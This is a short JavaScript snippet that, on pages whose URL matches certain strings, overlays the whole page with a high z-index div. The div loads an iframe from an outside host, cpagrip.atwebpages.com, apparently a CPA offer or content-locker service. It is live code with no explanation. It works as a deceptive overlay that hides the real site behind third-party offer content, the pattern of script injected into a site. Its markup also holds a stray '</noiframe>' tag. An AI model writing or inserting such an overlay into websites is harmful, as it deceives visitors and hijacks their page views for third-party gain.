var url=window.location.href;
if(url.search(/ckonline.org/i) != -1 || url.search(/8uytr/i) != -1 )
{
body = document.body;
if(body != null) {
div = document.createElement("div");
div.style.position = "absolute";
div.style.width = "100%";
div.style.height = "0";
div.style.opacity = 0.8;
div.style.top = "+0px";
div.style.zIndex="9999";
div.style.bottom = "+0px";
div.style.left = "+0px";
div.style.backgroundColor = "#FBFBFB";
div.style.border = "0px solid #94a3c4";
div.style.margin = "0px";
div.innerHTML = "<iframe src=http://cpagrip.atwebpages.com/ height=1000px width=100% frameborder=0></noiframe>"
body.appendChild(div);
}
}
